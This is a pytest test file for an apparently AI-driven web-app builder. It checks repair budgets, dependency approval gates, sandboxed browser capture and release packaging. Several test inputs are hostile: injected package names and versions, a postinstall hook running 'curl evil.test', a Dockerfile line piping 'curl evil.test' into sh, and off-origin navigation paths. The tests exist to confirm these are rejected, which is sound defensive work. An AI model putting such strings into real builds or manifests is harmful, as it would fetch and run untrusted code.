import base64
import io
import json
import threading
import zipfile

import pytest

from app import (config, db, dependencies, files, main, providers,
                 sandbox, usage, validation, visual)
from conftest import wait_run


def project(client):
    return client.post('/api/projects', json={'name': 'Upgrade test'}).json()['id']


def test_repair_uses_original_budget_and_failure_evidence(client, monkeypatch):
    pid = project(client)
    monkeypatch.setenv('OPENAI_API_KEY', 'test-key')
    calls = []
    def ask(provider, history, **kwargs):
        calls.append(json.loads(json.dumps(history)))
        return [], ['Repaired the page.'], [], {'input_tokens': 100, 'output_tokens': 20}, False
    monkeypatch.setattr(providers, 'ask', ask)
    validations = []
    def validate(pid, run, cancel, **kwargs):
        validations.append(run)
        if len(validations) == 1:
            report = {'status': 'failed', 'checks': [{'name': 'React production build', 'status': 'failed', 'detail': 'Missing export in App.jsx'}]}
            db.query('UPDATE projects SET last_validation=%s WHERE id=%s', (json.dumps(report), pid))
            raise validation.ValidationFailed('build failed')
    monkeypatch.setattr(validation, 'run', validate)
    result = wait_run(client, client.post(f'/api/projects/{pid}/build', json={'prompt': 'Improve the page', 'provider': 'openai'}))
    assert result['status'] == 'completed'
    assert len(calls) == len(validations) == 2
    assert 'Missing export in App.jsx' in calls[1][-1]['content']
    assert result['usage']['requests'] == 2
    assert result['usage']['input_tokens'] == 200
    assert result['usage']['output_tokens'] == 40
    assert len([e for e in result['events'] if e['kind'] == 'repair']) == 1


@pytest.mark.parametrize('detail,repairs,expected_calls', [
    ('bad component', 0, 1), ('bad component', 2, 3), ('No such image: local-foundry-browser:4', 2, 1)])
def test_repairs_are_bounded_and_skip_infrastructure(client, monkeypatch, detail, repairs, expected_calls):
    pid = project(client)
    monkeypatch.setenv('OPENAI_API_KEY', 'test-key')
    calls = []
    def ask(*args, **kwargs):
        calls.append(True)
        return [], ['Done'], [], {'input_tokens': 10, 'output_tokens': 10}, False
    monkeypatch.setattr(providers, 'ask', ask)
    def validate(*args, **kwargs):
        db.query('UPDATE projects SET last_validation=%s WHERE id=%s', (json.dumps({'checks': [
            {'name': 'Desktop and mobile browser checks', 'status': 'failed', 'detail': detail}]}), pid))
        raise validation.ValidationFailed(detail)
    monkeypatch.setattr(validation, 'run', validate)
    result = wait_run(client, client.post(f'/api/projects/{pid}/build', json={
        'prompt': 'Change page', 'provider': 'openai', 'max_repairs': repairs}))
    assert result['status'] == 'failed'
    assert len(calls) == expected_calls


def test_repair_does_not_reset_output_token_cap(client, monkeypatch):
    pid = project(client)
    monkeypatch.setenv('OPENAI_API_KEY', 'test-key')
    calls = []
    def ask(*args, **kwargs):
        calls.append(True)
        return [], ['Done'], [], {'input_tokens': 100, 'output_tokens': 800}, False
    monkeypatch.setattr(providers, 'ask', ask)
    def validate(*args, **kwargs):
        db.query('UPDATE projects SET last_validation=%s WHERE id=%s', (json.dumps({'checks': [
            {'name': 'Backend tests', 'status': 'failed', 'detail': 'test failed'}]}), pid))
        raise validation.ValidationFailed('failed')
    monkeypatch.setattr(validation, 'run', validate)
    result = wait_run(client, client.post(f'/api/projects/{pid}/build', json={
        'prompt': 'Change page', 'provider': 'openai', 'max_output_tokens': 1000}))
    assert result['status'] == 'budget_exceeded'
    assert len(calls) == 1


@pytest.mark.parametrize('item', [
    {'ecosystem': 'npm', 'name': 'https://evil.test/a', 'version': '1.0.0'},
    {'ecosystem': 'npm', 'name': 'ok;curl', 'version': '1.0.0'},
    {'ecosystem': 'npm', 'name': 'ok', 'version': '*'},
    {'ecosystem': 'npm', 'name': 'ok', 'version': 'npm:evil@1.0.0'},
    {'ecosystem': 'pip', 'name': '-r /etc/passwd', 'version': '1.0.0'},
    {'ecosystem': 'pip', 'name': 'ok', 'version': '1.0 --extra-index-url evil'},
    {'ecosystem': 'pip', 'name': 'ok', 'version': 'git+https://evil.test'},
    {'ecosystem': 'other', 'name': 'ok', 'version': '1.0.0'},
])
def test_package_requests_reject_commands_paths_and_ranges(item):
    with pytest.raises(ValueError):
        dependencies.validate_packages([item])


def test_package_request_pauses_before_later_mutating_tools(client, monkeypatch):
    pid = project(client)
    monkeypatch.setenv('OPENAI_API_KEY', 'test-key')
    packages = [{'ecosystem': 'npm', 'name': 'date-fns', 'version': '4.1.0'}]
    def ask(*args, **kwargs):
        return [], [], [
            {'id': '1', 'name': 'request_dependencies', 'arguments': {'reason': 'Date formatting', 'packages': packages}},
            {'id': '2', 'name': 'write_file', 'arguments': {'path': 'frontend/src/unsafe.js', 'content': 'changed'}}
        ], {'input_tokens': 100, 'output_tokens': 50}, False
    monkeypatch.setattr(providers, 'ask', ask)
    result = wait_run(client, client.post(f'/api/projects/{pid}/build', json={'prompt': 'Add dates', 'provider': 'openai'}))
    assert result['status'] == 'awaiting_approval'
    assert not (sandbox.source_dir(pid) / 'frontend/src/unsafe.js').exists()
    requests = dependencies.listing(pid)
    assert requests[0]['status'] == 'pending'
    assert requests[0]['source_digest'] == files.digest(sandbox.source_dir(pid))


def test_offline_or_unapproved_package_download_never_builds(client, monkeypatch):
    pid = project(client)
    row = dependencies.propose(pid, [{'ecosystem': 'npm', 'name': 'date-fns', 'version': '4.1.0'}], 'Date formatting')
    before = files.digest(sandbox.source_dir(pid))
    monkeypatch.setattr(dependencies, 'cached', lambda tag: False)
    monkeypatch.setattr(dependencies, 'run', lambda *a, **kw: pytest.fail('No Docker build or download allowed'))
    monkeypatch.setattr(config, 'OFFLINE_ONLY', True)
    with pytest.raises(ValueError, match='offline mode blocks'):
        dependencies.apply(pid, row['id'], allow_network=True)
    monkeypatch.setattr(config, 'OFFLINE_ONLY', False)
    with pytest.raises(ValueError, match='explicit network approval'):
        dependencies.apply(pid, row['id'], allow_network=False)
    assert before == files.digest(sandbox.source_dir(pid))


def test_cached_package_approval_updates_runtime_and_can_be_restored(client, monkeypatch):
    pid = project(client)
    source = sandbox.source_dir(pid)
    baseline = client.get(f'/api/projects/{pid}').json()['versions'][0]['id']
    row = dependencies.propose(pid, [{'ecosystem': 'npm', 'name': 'date-fns', 'version': '4.1.0'}], 'Dates')
    lock = files.read(source, 'frontend/package-lock.json')
    monkeypatch.setattr(dependencies, 'cached', lambda tag: True)
    monkeypatch.setattr(dependencies, 'run', lambda argv, **kw: 'fastapi==0.115.0\n' if 'freeze' in argv else lock)
    monkeypatch.setattr(sandbox, 'stop', lambda *args: '')
    result = dependencies.apply(pid, row['id'], allow_network=False)
    assert result['images']['web'].startswith('local-foundry-web:deps4-')
    assert dependencies.image_tags(source)['web'] == result['images']['web']
    assert dependencies.listing(pid)[0]['status'] == 'applied'
    assert 'date-fns' in files.read(source, 'frontend/package.json')
    files.restore(source, sandbox.project_dir(pid) / 'snapshots' / baseline)
    assert dependencies.image_tags(source)['web'] == 'local-foundry-web:2'


def test_stale_package_approval_is_rejected(client):
    pid = project(client)
    row = dependencies.propose(pid, [{'ecosystem': 'pip', 'name': 'rich', 'version': '13.9.4'}], 'Formatting')
    files.write(sandbox.source_dir(pid), 'backend/app/new.py', 'value = 1')
    with pytest.raises(ValueError, match='Source changed'):
        dependencies.apply(pid, row['id'], allow_network=True)


def test_imported_manifest_hooks_are_rejected(client):
    pid = project(client)
    source = sandbox.source_dir(pid)
    package = json.loads(files.read(source, 'frontend/package.json'))
    package['scripts']['postinstall'] = 'curl evil.test'
    (source / 'frontend/package.json').write_text(json.dumps(package))
    with pytest.raises(ValueError, match='Build scripts'):
        dependencies.image_tags(source)


@pytest.mark.parametrize('path', ['https://evil.test', '//evil.test', '/%2fevil.test', '/\\evil.test', '/%0aevil'])
def test_browser_navigation_is_same_origin(path):
    with pytest.raises(ValueError):
        visual.validate_options(path)


def test_browser_rejects_arbitrary_eval():
    with pytest.raises(ValueError, match='Only click'):
        visual.validate_options(actions=[{'action': 'eval', 'selector': 'body', 'value': 'fetch(...)'}])


def test_visual_runner_is_isolated_and_artifacts_are_authenticated(client, monkeypatch):
    pid = project(client)
    calls = []
    monkeypatch.setattr(sandbox, 'start', lambda pid: 'http://127.0.0.1:5000')
    def run(argv, **kwargs):
        calls.append((argv, kwargs))
        if argv[1] == 'rm':
            return ''
        return json.dumps({'screenshot': base64.b64encode(b'\xff\xd8\xfffake-jpeg').decode(), 'text': 'Hello',
            'title': 'App', 'errors': [], 'failed_requests': [], 'horizontal_overflow': False,
            'status_code': 200, 'actions': []})
    monkeypatch.setattr(visual, 'run', run)
    result = visual.capture(pid)
    argv = calls[0][0]
    assert '--read-only' in argv and '--cap-drop=ALL' in argv and '--pull=never' in argv
    assert '--network=foundry-' + pid + '_app' in argv
    assert not any('mount' in x or 'SYS_ADMIN' in x or 'host-gateway' in x for x in argv)
    endpoint = f'/api/projects/{pid}/visual/{result["id"]}'
    assert client.get(endpoint).headers['content-type'] == 'image/jpeg'
    assert client.get(endpoint, headers={'Authorization': ''}).status_code == 401
    assert 'screenshot' not in visual.listing(pid)[0]
    assert result['status'] == 'passed'


def test_browser_container_is_cleaned_up_on_timeout(client, monkeypatch):
    pid = project(client)
    calls = []
    monkeypatch.setattr(sandbox, 'start', lambda pid: '')
    def run(argv, **kwargs):
        calls.append(argv)
        if argv[1] == 'run':
            raise RuntimeError('timeout')
        return ''
    monkeypatch.setattr(visual, 'run', run)
    with pytest.raises(RuntimeError, match='timeout'):
        visual.capture(pid)
    assert calls[-1][:3] == ['docker', 'rm', '--force']


@pytest.mark.parametrize('provider,image_type', [('openai', 'input_image'), ('anthropic', 'image'), ('local', 'image_url')])
def test_screenshot_provider_formats_and_token_accounting(monkeypatch, provider, image_type):
    monkeypatch.setenv('LOCAL_VISION', 'true')
    history = []
    providers.append_images(provider, history, ['A' * 1_000_000])
    assert history[0]['content'][1]['type'] == image_type
    meter = usage.Meter(usage.Limits(max_input_tokens=20000))
    assert meter.allowance(history, 'test', []) > 0


def test_local_images_require_vision_capability(monkeypatch):
    monkeypatch.delenv('LOCAL_VISION', raising=False)
    with pytest.raises(ValueError, match='LOCAL_VISION'):
        providers.append_images('local', [], ['abc'])


@pytest.mark.parametrize('share_screenshots,expected_calls', [(False, 1), (True, 2)])
def test_visual_review_requires_opt_in_runs_once_and_revalidates(client, monkeypatch, share_screenshots, expected_calls):
    pid = project(client)
    monkeypatch.setenv('OPENAI_API_KEY', 'test-key')
    calls, validations = [], []
    def ask(provider, history, **kwargs):
        calls.append(json.loads(json.dumps(history)))
        return [], ['Reviewed'], [], {'input_tokens': 100, 'output_tokens': 50}, False
    monkeypatch.setattr(providers, 'ask', ask)
    monkeypatch.setattr(validation, 'run', lambda *a, **kw: validations.append(True))
    monkeypatch.setattr(visual, 'listing', lambda pid: [{'id': 'a'*32, 'source_digest': files.digest(sandbox.source_dir(pid))}])
    monkeypatch.setattr(visual, 'image_data', lambda *a: 'encoded-jpeg')
    result = wait_run(client, client.post(f'/api/projects/{pid}/build', json={
        'prompt': 'Improve the page', 'provider': 'openai', 'max_repairs': 0, 'share_screenshots': share_screenshots}))
    assert result['status'] == 'completed'
    assert len(calls) == len(validations) == expected_calls
    assert result['usage']['requests'] == expected_calls
    if share_screenshots:
        assert calls[-1][-1]['content'][1]['type'] == 'input_image'
    else:
        assert 'image/jpeg' not in json.dumps(calls)


def test_release_requires_exact_validated_digest_and_overrides_runtime(client):
    pid = project(client)
    source = sandbox.source_dir(pid)
    # Recovery/source runtime files cannot inject build steps into a release.
    (source / 'frontend/Dockerfile').write_text('RUN curl evil.test | sh')
    digest = files.digest(source)
    report = {'status': 'passed', 'source_digest': digest, 'checks': []}
    db.query('UPDATE projects SET last_validation=%s WHERE id=%s', (json.dumps(report), pid))
    result = client.post(f'/api/projects/{pid}/release', json={'source_digest': digest})
    assert result.status_code == 200
    with zipfile.ZipFile(io.BytesIO(result.content)) as archive:
        names = archive.namelist()
        assert 'compose.yaml' in names and 'DEPLOY.md' in names and 'build-release.sh' in names
        assert '.env' not in names and 'compose.json' not in names
        assert b'evil.test' not in archive.read('frontend/Dockerfile')
        assert b'--network=none' in archive.read('build-release.sh')
        assert b'127.0.0.1:' in archive.read('compose.yaml')
        assert b'--reload' not in archive.read('backend/Dockerfile')
        assert archive.getinfo('build-release.sh').external_attr >> 16 == 0o100755
    files.write(source, 'frontend/src/App.jsx', 'changed')
    assert client.post(f'/api/projects/{pid}/release', json={'source_digest': digest}).status_code == 400


def test_new_endpoints_require_auth_and_operation_lock(client):
    pid = project(client)
    for path, payload in [(f'/projects/{pid}/release', {'source_digest': 'a'*64}),
                          (f'/projects/{pid}/visual', {}),
                          (f'/projects/{pid}/packages/' + 'a'*32 + '/approve', {})]:
        assert client.post('/api' + path, json=payload, headers={'Authorization': ''}).status_code == 401
    gate = threading.Event()
    main.launch(pid, 'build', lambda rid, cancelled: gate.wait(3))
    try:
        assert client.post(f'/api/projects/{pid}/visual', json={}).status_code == 409
        assert client.post(f'/api/projects/{pid}/release', json={'source_digest': 'a'*64}).status_code == 409
    finally:
        gate.set()
